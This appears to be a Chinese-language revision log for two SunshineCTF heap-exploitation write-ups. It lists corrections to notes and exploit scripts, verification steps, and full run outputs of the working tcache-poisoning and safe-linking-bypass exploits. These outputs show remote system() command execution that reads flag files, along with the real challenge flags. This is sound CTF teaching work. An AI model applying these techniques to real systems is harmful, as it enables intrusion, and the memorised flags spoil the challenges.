# Round 2 修正紀錄 — `pwn4/cache_money` + `pwn6/code_breaker`（heap 教材）

> 對應審查報告：`wp/review_round2_heap.md`
> 可編輯檔案（本次只動這四個）：
> `pwn4/notes.md`、`pwn4/exploit.py`、`pwn6/notes.md`、`pwn6/exploit.py`
> 環境：Arch Linux、glibc 2.39（題目附的 `libc.so.6`/`ld-linux-x86-64.so.2`）、pwntools、純 gdb。
> **每一項都先重跑審查者的驗證指令確認後才動手**；審查者的驗證方法不足以支持結論時，
> 改用別的驗證方式並在下面註明（見 E9、B2）。

---

## 0. 統計

| 類別 | 總數 | 已修／已補 | 略過（原因） |
|---|---|---|---|
| E 錯誤（E1~E15） | 15 | **15** | 0 |
| B 新手卡點（B1~B8） | 8 | **8** | 0 |
| S 一致性（S1~S7） | 7 | notes 端 4（S1/S5/S6 + 互相指路） | 3（S2/S3/S4/S7 屬 `wp/00`、`wp/99`，**非本次可編輯檔案**） |
| **合計** | **30** | **27** | **3（皆已移交，見 `wp/pending_wp00_fixes_from_heap.md`）** |

四支 exploit：**local + REMOTE 全 PASS**（輸出貼在 §4）。`pwn4/FLAG.txt` 與 `pwn6/FLAG.txt`
修正後仍舊是真正的遠端 flag。

---

## 1. E 錯誤（15/15 已修）

| # | 嚴重度 | 檔案 | 一句話 | 狀態 |
|---|---|---|---|---|
| E1 | 高 | `pwn4/notes.md` §5.5 | fastbin「也只放 7 個」→ 改成「沒有數量上限」＋附實測（13 塊） | 已修 |
| E2 | 高 | `pwn4/notes.md` §5.3 | `entries[7] = 0x406960` → `0x406970`（= chunk 標頭 + 0x10） | 已修 |
| E3 | 高 | `pwn4/notes.md` §4.2 | `read_int` 尾段整段重抄；「EOF → 回 -1」→「EOF → `exit(0)`」 | 已修 |
| E4 | 中 | `pwn4/notes.md` §4.3 | 序言段位址／offset／`sub rsp,0x38` 全部更正 | 已修 |
| E5 | 中 | `pwn4/notes.md` §4.3 | `calloc` 的 `edi`/`esi` 抄反（實為 `esi=1`、`edi=0x30`） | 已修 |
| E6 | 中 | `pwn4/notes.md` §4.4/4.5/4.6 | 三段的指令位址整排位移，改用 objdump 原文重貼 | 已修 |
| E7 | 中 | `pwn4/notes.md` §2 | Partial RELRO 漏掉 `.got`；更正為 `0x403dc0~0x404000` | 已修 |
| E8 | 低 | `pwn4/notes.md` §3.4 | `jmp QWORD PTR [rip+0x2eae]` → `[rip+0x2ea6]`（+6 才是 rip） | 已修 |
| E9 | 低 | `pwn4/notes.md` §5.5 | small bin `0x90~0x400` → `0x90~0x3f0（< 0x400）` | 已修 |
| E10 | 中 | `pwn6/notes.md` §6.4 | payload 長度 `0x1e` → `00 47`（71 bytes） | 已修 |
| E11 | 低 | `pwn6/notes.md` §2.5 | `system` 的 lazy-binding stub 是 `0x1080`，不是 `0x1030` | 已修 |
| E12 | 低 | `pwn4/notes.md` §9、`pwn6/notes.md` §8 | transcript 改成逐字（補啟動行、MENU echo、二進位 echo 說明） | 已修 |
| E13 | 低 | `pwn4/notes.md` §3.1 | `r8~r11 第 5、6 個參數` → 只有 `r8/r9` | 已修 |
| E14 | 低 | `pwn4/notes.md` §4.2 | `mov edi,2` → `mov edi,0x2` | 已修 |
| E15 | 低 | `pwn6/exploit.py` | 本地測試會無條件覆蓋 `FLAG.txt` → 加保護 | 已修 |

### 逐項驗證與處理

**E1（已修）** — 用題目附的 2.39 libc 重跑審查者的 C 程式，輸出 **完全一致**：

```
glibc 2.39
freed 20 chunks of tcache-size 0x20: fastbin chain length=13
```

⇒ fastbin 沒有 7 的上限。`pwn4/notes.md` §5.5 改成「**沒有數量上限**（7 是 tcache 的規矩）」，
並把這段 C 程式碼與實測輸出貼進筆記；另外補上「fastbin 的 `next` 存 chunk 標頭、
tcache 的 `next` 存 user 位址」這個差異。

**E2（已修）** — gdb 實測（`b *0x401b21`，輸入檔見 B5）：

```
entries[2]=0x406930 entries[7]=0x406970
chunk walk: 0x406920 0x41 | 0x406960 0x91        ← 0x406960 是 W6 的 ledger 標頭
```

⇒ 正確值是 `0x406970`。§5.3 改掉，並在該節補上「`entries[]` 是**明文** user 位址、
只有 chunk 內的 `next` 才編碼」的說明與對照圖（同時處理 B6）。

**E3（已修）** — `objdump -d -M intel --start-address=0x401510 --stop-address=0x4015b0`
逐條核對：筆記後半段（`401535`~`40157e`）幾乎全部位址錯，且語意也錯：

```
40155c: je 401590            ← EOF → 401590
401590: xor edi,edi ; 401592: call 401140? → call 4011e0 <exit@plt>   ★ exit(0)，不是回 -1
40156d: mov edx,eax ; 40156f: cmp eax,0xf ; 401572: ja 401597        ★ 32-bit 無號比較
```

⇒ 整個 §4.2 區塊換成 objdump 原文（含 `←` 註解），並新增「重點 2：EOF 是 `exit(0)`」。
原本的結論「沒有負索引漏洞」保留（結論正確），但理由改成「`cmp eax,0xf` + `ja` 一次擋掉」。

**E4／E5（已修）** — `objdump` 證實：函式起點 `0x4015b0`、`4015b9: lea rbp,[rip+0x2b00]`、
`4015c3: sub rsp,0x38`、`401620: mov esi,0x1`、`401625: mov edi,0x30`（位元組碼 `be`/`bf` 可辨）。
§4.3 整段重寫，標題也改成「起點 0x4015b0，slot 掃描迴圈從 0x4015e0 開始」。

**E6（已修，且不止 20 處）** — 我寫了一支腳本，把筆記裡每一行以 16 進位位址開頭的組語
抓出來跟 `objdump` 逐字比對。除了審查者列的代表案例，還發現審查者沒列的：

* §3.2 的範例：`40197d`、`401982` **在 binary 裡根本不是指令邊界**
  （實際是 `40197a: lea rsi,#4025b3`、`401983: mov edi,0x2`、`401989: jmp __printf_chk@plt` 尾呼叫）；
* §4.3 `4015fe: jmp 4017b4`（實際 `401606: lea rdi,#402180` / `401617: jmp puts@plt`）；
* §4.4 `401828: printf(...)`（實際 `401823: lea rsi,#402560`、call 在 `401831`）、
  `401860/401864/401873` 的順序與 `40187d`（實際是 `jmp __printf_chk@plt`）；
* §4.5 `4018c9`、`4018ce`、`401967: jne __stack_chk_fail`（實際 `40196c`）。
* §4.1／§4.4 的 `...` 佔位符改成真實指令。

處理方式採納審查者建議：**整區塊改成 objdump 原文重貼**（只拿掉機器碼欄、保留
`←` 中文註解），並在 §4 開頭註明「這些位址可以逐條在自己的 objdump 裡對」。
改完後重跑比對腳本：**340 條引用中 0 條位址／運算元錯誤**
（剩下 38 條是我的腳本把「`# 404090`」對 objdump 的「`# 404090 <stdin@GLIBC_2.2.5>`」
以及 objdump 才印的 `+0x0` 後綴當成不一致的誤判，已人工確認語意相同）。

**E7（已修）** — `readelf -l/-S`：

```
GNU_RELRO 0x2dc0 0x403dc0 0x403dc0 size 0x240      → 到 0x404000
[20] .init_array 0x403dc0   [23] .got 0x403fd8   [24] .got.plt 0x403fe8
objdump -R | head → 函式 GOT 從 0x404000 起
```

⇒ §2 的 `readelf` 區塊補上 size 與 `.got`/`.got.plt`/`objdump -R` 三行；
保護表格的 RELRO 說明改成「`.got` 也唯讀，可寫的是 `0x404000` 之後的函式 GOT 項目
（含 `strtol@0x404040`）」。與 `wp/00` §4.4 的說法一致了。

**E8（已修）** — `401194: ff 25 a6 2e 00 00  jmp QWORD PTR [rip+0x2ea6] # 404040`。
`0x401194 + 6 + 0x2ea6 = 0x404040` ✔。筆記改成 `0x2ea6`，並補一句「rip 是下一條指令，
所以加 6 不是加 5」。

**E9（已修，但審查者的驗證方法不採用）** — 我照審查者的建議試著用
「`malloc(0x3f0)` 觀察它進 large bin」來實測，但用 gdb 走訪 `main_arena.bins[]`
時發現相鄰的 free chunk 會被 **backward consolidation 合併成 0x800**
（`p[8]`、`p[9]` 相鄰），單看 bin 指標無法乾淨地區分 bin 63/64，我判定這個實測方式
**不足以支持結論**。改用 glibc 的定義驗證（這是決定性的）：`malloc.c` 裡
`MIN_LARGE_SIZE = NSMALLBINS * SMALLBIN_WIDTH = 64 * 16 = 0x400`、
`in_smallbin_range(sz) = ((unsigned long)(sz) < MIN_LARGE_SIZE)`，
所以 `0x400` 不是 small bin；small bin 實際涵蓋 `0x20 ~ 0x3f0`。
⇒ §5.5 改成 `small bin：0x90 ~ 0x3f0（< 0x400）`，並把 large bin 那行改成
「`>= 0x400`（0x400 已是第一條 large bin）」。

**E10（已修）** — 實測：

```bash
python3 -c "c=b'cat flag.txt /flag /home/*/flag.txt 2>/dev/null; ls -la; id; echo DONE'; print(len(c), hex(len(c)+1))"
# 70 0x47
```

⇒ §6.4 的圖改成 `00 47` / `len=0x47`，並解釋「長度前綴算的是前綴之後的全部 bytes
（含 cmd 那 1 byte）」，另附最小案例 `/bin/sh` 的 `0x0b` 當對照。

**E11（已修）** — `readelf` + `objdump`：`system` 是第 6 個 JUMP_SLOT（`0x4028 = 0x4000+5*8`），
`0x1080: push 0x5; jmp 0x1020`；`0x1030` 是第 1 個 JUMP_SLOT 也就是 `free` 的
（`push 0x0`）。⇒ §2.5 改成 PLT0（`0x1020`）+ stub 模式，並明確指出 `system` 的 stub 是 `0x1080`。

**E12（已修）** — §9.1／§9.2／§8.1／§8.2 的 transcript 全部換成本輪**實跑輸出**：
補上 `[x] Starting local process ...`／`[+] Starting local process ...: pid NNNN`、
`[+] Deposited 8 bytes. New balance: 8`、整段 `MAIN MENU` echo、遠端連線的
`[x] ... Trying 35.211.211.18` 第二行、以及 `[*] Stopped/Closed ...` 收尾行；
並新增「新手最容易以為跑壞了的 N 件事」說明，其中包含
**`pwn6` 結尾那串二進位加密流 echo**（附 `| tr -d '\000'` 的建議）。

**E13（已修）** — §3.1 改成
`r8, r9  第 5、6 個參數（r10、r11 是 caller-saved 暫存器，不是參數暫存器；r10 只在 syscall 當第 4 個參數）`。

**E14（已修）** — objdump 一律印十六進位，§4.2 改成 `mov edi,0x2`。

**E15（已修）** — `pwn6/exploit.py` 寫檔處改成：

```python
        # NEVER let a local test run clobber the captured *real* flag:
        try:
            with open(os.path.join(HERE, 'flag.txt')) as f:
                local_flag = f.read().strip()
        except OSError:
            local_flag = ''
        if remote_mode or flag != local_flag:
            with open(os.path.join(HERE, 'FLAG.txt'), 'w') as f:
                f.write(flag + '\n')
        else:
            log.info('local test flag -> FLAG.txt left untouched')
```

比審查者的建議更嚴一點：不是硬比字串 `'sun{local_test_flag}'`，而是
**跟本地 `flag.txt` 的內容比對**（換掉 dummy flag 也安全），並且 `REMOTE` 模式一定寫檔。
實跑驗證：本地跑完 `FLAG.txt` 仍是 `sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}`，且會印
`[*] local test flag -> FLAG.txt left untouched`。

---

## 2. B 新手卡點（8/8 已補／已修）

| # | 檔案 | 一句話 | 狀態 |
|---|---|---|---|
| B1 | `pwn6/notes.md` | 新增 §3.5「heap 最小語彙」（chunk／bin／tcache／safe-linking）＋指路 `wp/99 §8`、`pwn4 §5` | 已補 |
| B2 | `pwn6/notes.md` | `P` 正名為「`malloc` 回傳的 user 位址」，chunk 標頭 = `P-0x10` | 已修 |
| B3 | `pwn4/notes.md` | §7.3 補 tcache 三態圖（空鏈／環／毒化後） | 已補 |
| B4 | `pwn4/notes.md` | §8.3 補 `POISON_SLOT = 6` 的 6 行 slot 掃描推導 | 已補 |
| B5 | `pwn4/notes.md` | §6 補「怎麼重現這張 heap 佈局表」的輸入檔＋gdb 指令＋實測輸出 | 已補 |
| B6 | `pwn4/notes.md` | §5.3/§5.4 講清「`entries[]` 明文 vs chunk 內 `next` 編碼」＋對照圖 | 已補 |
| B7 | `pwn6/notes.md` | §6.3 補「為什麼 `CHUNK = 0x80`」 | 已補 |
| B8 | `pwn6/notes.md` | §4.3 補 safe-linking 的 gdb 實測（含最小 C 程式與可照抄的 gdb 指令） | 已補 |

**B1（已補）** — 在 `## 4.` 之前插入 `## 3.5 heap 最小語彙：chunk / bin / tcache / safe-linking`：
(1) chunk 標頭圖（`prev_size`/`size`、user data、`chunk 標頭 = P-0x10`、size 的 3 個 flag bit）、
(2) free 後的 `next`/`key` 圖（並解釋 tcache/unsorted/fastbin 對同一格的三個名字）、
(3) bin 與 tcache 的流程圖（LIFO、7 per size、`tc_idx` 公式、fastbin 沒有 7 上限、
`entries[]` 是明文）、(4) `PROTECT_PTR` 的編碼/解碼與「只需要 `P>>12`」。
開頭即指路 `wp/99_速查表.md` §8 與 `../pwn4/notes.md` §5（補上原本 0 筆的引用）。
另外在檔頭也加了一行同樣的指路。

**B2（已修，但把審查者的理由改寫成正確版）** — 原文把 `pos` 說成「chunk 自己的位址」，
全部改成 `P`（= `chunk2mem` 的結果 = `malloc` 回傳值），並明確寫出 `chunk 標頭 = P - 0x10`。
**注意**：審查者說「拿 chunk 標頭去算會把 `system@plt` 寫到 `PIE+0x40d0`」，
這個因果推論**不精確**——`>>12` 會丟掉低 12 bits，只要 `P` 與 `P-0x10` 同頁
（絕大多數情況）XOR 出來的值**一模一樣**，實測 `P=0x55555555b2a0` 時
`P>>12` 與 `(P-0x10)>>12` 都是 `0x55555555b`，所以「拿標頭當 key」通常還是會動。
真正會產生「寫到 `+0x40d0`、`[0x40c0]` 沒被改」這個症狀的是**把攻擊目標也當成 chunk**
（即目標填 `PIE+0x40d0`）。因此 §4.3 用一個 `⚠️ 新手最容易錯的兩件事` 框把
**兩種錯誤情境分開寫清楚**（標頭當 key：觀念錯、極少數情況差 1；
目標 +0x40d0：一定失敗且症狀隱蔽），而不是照抄不精確的因果。

**B3（已補）** — §7.3 的利用鏈後面補「tcache 串列的三種狀態」：

```
 (2a) 空鏈 free 完      entries[1] ──► P ；P->next = P>>12
 (2b) double free 後    entries[1] ──► P ──► P ；P->next = P^(P>>12)
 (2c) 毒化後            entries[1] ──► P ──► 0x4040c0
```

三態我都驗過：(2a)(2b) 用 gdb 實測（見 B8 的同一支程式，`pwn6 §4.3` 附完整指令與數值），
(2c) 由 exploit 實跑 PASS（毒化失敗的話後面的任意讀指紋比對一定不會通過）。

**B4（已補）** — §8.3 新增「`POISON_SLOT = 6` 是怎麼算出來的？」：把每一步的 slot 掃描結果
排出來（`Open S→0, D→1, W0..W6→2..8`、`Close 2..8 → NULL`、`P0→2, P1→3, P2→4`、
`transfer(2,3)` 後 slot2 仍非 NULL、`P3→5`、`P4→6`），並強調
「`slots[i]` **只有 Close 才會設 NULL**」（`Transfer` 只清 `active`/`ledger`）。
§8.0 的常數行也加了「推導見 §8.3」。

**B5（已補）** — §6 開頭新增可照抄的重現步驟：產生 `/tmp/in.bin` 的 `printf` 迴圈、
`gdb -q -batch -ex 'b *0x401b21' -ex 'run < /tmp/in.bin' ./cm_dbg -ex 'x/2gx 0x405000' ...`、
`cm_dbg` 不見時的 `patchelf` 指令，以及節錄的實測輸出。
我照這串指令跑出的佈局與 §6 的表**完全一致**（`0x405000 0x291` … `0x4069f0 0x1f611`）。

**B6（已補）** — §5.3 補 `💡` 區塊：「`tcache->entries[]` 裡躺的是**明文**的 malloc 回傳位址；
只有 chunk 內部的 `next` 才是編碼過的」，並列出三個推論；§5.4 再補一張
「`entries[7]`（明文）↔ chunk 內 `next`（編碼）」的對照圖，明講
「洩漏 `P>>12` 就足以偽造 `fd`，這是 flag `s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che` 的意義」。

**B7（已補）** — §6.3 新增「為什麼 `CHUNK = 0x80`？」：size 只受 `cmd 0x10` 的
`1 <= size <= 0x400` 限制，選 0x80 只是(a) chunk 0x90 → tcache idx 7 這條鏈一定是空的、
(b) `__memcpy_chk` 的 `destlen = size` 剛好放得下 `system@plt`；換 size 也一樣能打。

**B8（已補）** — §4.3 新增 gdb 實測：把流程抽成最小 C 程式（`free` → UAF 寫清 next/key →
再 `free`），附完整 `gcc`/`patchelf`/`gdb` 指令與**真實數值**：

```
Breakpoint 1 (free #1 之後)
P=0x55555555b2a0  P-0x10=0x55555555b290  P>>12=0x55555555b
0x55555555b2a0: 0x000000055555555b   0x8885eebd61c58fb7    ← next == P>>12
Breakpoint 2 (double free 之後)
0x55555555b2a0: 0x000055500000e7fb   0x8885eebd61c58fb7    ← next == P^(P>>12)
```

（審查者提供的是「示意值」；我改成實際跑出來的、且 `P` 在 gdb 下每次相同可重現。
`key` 欄位是隨機 `tcache_key`，每次不同，筆記已註明。）同一支程式也順便
證明了 `(P-0x10)>>12 == P>>12`，用來支撐 B2 的說明。

---

## 3. S 一致性（notes 端已處理 3 項，其餘移交）

| # | 內容 | 狀態 |
|---|---|---|
| S1 | `wp/00` 沒有 heap 章節、兩份 notes 都沒引用 `wp/99` §8 | notes 端**已修**（兩份 notes 檔頭各加指路）；`wp/00` 端**移交** |
| S2 | `wp/00` 對 pwn6 的三處描述與筆記矛盾（ROP／UAF 只列 pwn4／Uninitialised memory） | **移交**（`wp/00` 非本次可編輯檔案）→ 見 `wp/pending_wp00_fixes_from_heap.md` |
| S3 | `wp/99` §8 說 safe-linking「要先知道 chunk 位址」 | **移交**（`wp/99` 非本次可編輯檔案） |
| S4 | `wp/99` §8 少 3 個現代 glibc 細節（entries 明文／`aligned_OK`／`tcache_put` 寫入順序） | 前 1 點已寫進 `pwn4` §5.3 與 `pwn6` §3.5；`wp/99` 端**移交**。後 2 點原本就在 `pwn4` §10 坑 5 與 §5.3 有寫，`wp/99` 端**移交** |
| S5 | RELRO 描述不一致（= E7） | 已修（`pwn4` §2） |
| S6 | 暫存器表術語不一致（= E13） | 已修（`pwn4` §3.1） |
| S7 | `fd`/`bk` vs `next`/`key` 三個名字 | 已補在 `pwn6` §3.5 (2) 與 `pwn4` §5.5；`wp/99` 端**移交** |

**S1（notes 端已修）** — `pwn4/notes.md` 檔頭加：
「完全沒學過 heap 的話，先讀 `wp/99_速查表.md` §8（迷你版），再回來讀本檔 §5；
同一手法在 pwn6 會再用一次」；`pwn6/notes.md` 檔頭加對應的指路
（`wp/99` §8、`../pwn4/notes.md` §5、本檔 §3.5）。

---

## 4. 四支 exploit 實跑輸出（修正後重跑）

### 4.1 `cd pwn4 && python3 exploit.py < /dev/null` → **PASS**

```
[x] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn4/ld-linux-x86-64.so.2'
[+] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn4/ld-linux-x86-64.so.2': pid 3546992
[+] unsorted bin head : 0x7f9653603b20
[+] libc base         : 0x7f9653400000
[+] safe-linking key  : 0x55557c9c5
[+] libc fingerprint  : Ubuntu glibc 2.39 (all GOT entries match)
[+] system() = 0x7f9653458740
[+] Deposited 8 bytes. New balance: 8

--- MAIN MENU ---
1) Open Wallet
2) Deposit (write to ledger)
3) Withdraw (read from ledger)
4) Transfer
5) Close Wallet
6) List Wallets
0) Exit
>>> sun{LOCAL_TEST_FLAG}
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE


FLAG: sun{LOCAL_TEST_FLAG}
[*] Stopped process '/home/kzzz/Documents/code/ctf/sunshine/pwn4/ld-linux-x86-64.so.2' (pid 3546992)
```

### 4.2 `cd pwn4 && python3 exploit.py REMOTE < /dev/null` → **PASS**

```
[x] Opening connection to chal.sunshinectf.games on port 26004
[x] Opening connection to chal.sunshinectf.games on port 26004: Trying 35.211.211.18
[+] Opening connection to chal.sunshinectf.games on port 26004: Done
[+] unsorted bin head : 0x7a6f99bf8b20
[+] libc base         : 0x7a6f999f5000
[+] safe-linking key  : 0x131d2
[+] libc fingerprint  : Ubuntu glibc 2.39 (all GOT entries match)
[+] system() = 0x7a6f99a4d740
[+] Deposited 8 bytes. New balance: 8

--- MAIN MENU ---
1) Open Wallet
2) Deposit (write to ledger)
3) Withdraw (read from ledger)
4) Transfer
5) Close Wallet
6) List Wallets
0) Exit
>>> sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}
uid=1337(cache_money) gid=1337(cache_money) groups=1337(cache_money)
DONE


FLAG: sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}
[*] Closed connection to chal.sunshinectf.games port 26004
```

### 4.3 `cd pwn6 && python3 exploit.py < /dev/null`（`| tr -d '\000'`）→ **PASS**

```
[x] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn6/./ld-linux-x86-64.so.2'
[+] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn6/./ld-linux-x86-64.so.2': pid 3547245
[+] handshake ok, key schedule = 1c3bd82f232f81b2f1977a96605c0a28
[+] PIE base = 0x7f3732b7d000
[*] target function pointer @ 0x7f3732b810c0  ->  system@plt 0x7f3732b7e150
[+] heap leak: stored_next=0x5550ddea8fa0 tcache_key=0x515679877c72ebed
[+] victim P (malloc user ptr) = 0x555588b20480
[+] wrote system@plt into <0x7f3732b810c0>
[+] verified: [0x7f3732b810c0] == 0x7f3732b7e150
[*] triggering system(b'cat flag.txt /flag /home/*/flag.txt 2>/dev/null; ls -la; id; echo DONE')
sun{local_test_flag}
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE
H��}sMVl���EwO�8���H7���...（結尾的加密流 echo）
FLAG: sun{local_test_flag}
[*] local test flag -> FLAG.txt left untouched
[*] Stopped process '/home/kzzz/Documents/code/ctf/sunshine/pwn6/./ld-linux-x86-64.so.2' (pid 3547245)
```

### 4.4 `cd pwn6 && python3 exploit.py REMOTE < /dev/null`（`| tr -d '\000'`）→ **PASS**

```
[x] Opening connection to chal.sunshinectf.games on port 26005
[x] Opening connection to chal.sunshinectf.games on port 26005: Trying 35.211.211.18
[+] Opening connection to chal.sunshinectf.games on port 26005: Done
[+] handshake ok, key schedule = 78e0b3916d406e1bb0135711e3a4ce22
[+] PIE base = 0x5d314b043000
[*] target function pointer @ 0x5d314b0470c0  ->  system@plt 0x5d314b044150
[+] heap leak: stored_next=0x5d34bc177498 tcache_key=0x364f6e07b70a16a
[+] victim P (malloc user ptr) = 0x5d316f018480
[+] wrote system@plt into <0x5d314b0470c0>
[+] verified: [0x5d314b0470c0] == 0x5d314b044150
[*] triggering system(b'cat flag.txt /flag /home/*/flag.txt 2>/dev/null; ls -la; id; echo DONE')
sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}
uid=1337(code_breaker) gid=1337(code_breaker) groups=1337(code_breaker)
DONE
H�,1�IO`.�I�gO/�Gt[�}y��...（結尾的加密流 echo）
FLAG: sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}
[*] Closed connection to chal.sunshinectf.games port 26005
```

### 4.5 總結

| 測試 | 指令 | 結果 | flag |
|---|---|---|---|
| pwn4 local | `python3 exploit.py` | **PASS** | `sun{LOCAL_TEST_FLAG}` |
| pwn4 REMOTE | `python3 exploit.py REMOTE` | **PASS** | `sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}` |
| pwn6 local | `python3 exploit.py` | **PASS** | `sun{local_test_flag}` |
| pwn6 REMOTE | `python3 exploit.py REMOTE` | **PASS** | `sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}` |

修正後 `FLAG.txt` 內容確認：

```
pwn4/FLAG.txt: sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}      ← 真遠端 flag（未被本地跑覆蓋）
pwn6/FLAG.txt: sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}          ← 真遠端 flag（E15 修正後本地跑不會蓋掉）
```

---

## 5. 本次動到的檔案

| 檔案 | 動了什麼 |
|---|---|
| `pwn4/notes.md` | E1~E9、E12~E14（15 處錯誤中的 12 處）；B3~B6；S1 指路；§4.2~§4.6 與 §3.2 的組語改用 objdump 原文 |
| `pwn4/exploit.py` | **未改**（本輪不需要改；E12 只在 notes 貼真實輸出） |
| `pwn6/notes.md` | E10、E11、E12（pwn6 端）、B1、B2、B7、B8；新增 §3.5；§6.3/§6.4 圖重畫；新增 §4.3 gdb 實測 |
| `pwn6/exploit.py` | E15（保護 `FLAG.txt`）；另外把 `victim chunk P` 這個標籤正名為 `victim P (malloc user ptr)`（B2 的一致性） |

未動：`wp/00_基礎知識_從零開始.md`、`wp/99_速查表.md`、`wp/README.md`、
審查檔、其他 `pwnN/`。

## 6. 審查者結論中我沒有照抄的地方

1. **E9 的驗證方法**（「用 `malloc(0x3f0)` 觀察它進 large bin」）在 2.39 上不乾淨
   （相鄰 free chunk 會合併），我改用 glibc 的 `in_smallbin_range`/`MIN_LARGE_SIZE`
   定義驗證；**結論相同**（0x400 不是 small bin），所以照修。
2. **B2 的因果推論**：審查者說「拿 chunk 標頭（`P-0x10`）去 XOR 會把 `system@plt`
   寫到 `PIE+0x40d0`」。前半（`P` 的定義）正確並已照修；但「寫到 +0x40d0」的成因
   其實是**把攻擊目標當成 chunk 標頭**（目標填 `PIE+0x40d0`），不是 key 用錯——
   因為 `>>12` 讓 `P>>12` 與 `(P-0x10)>>12` 幾乎永遠相同。筆記改成把兩種錯誤分開講清楚。
3. 其餘 E1~E15、B1、B3~B8 的敘述我逐項復驗後**皆成立**，沒有其他需要略過的項目。
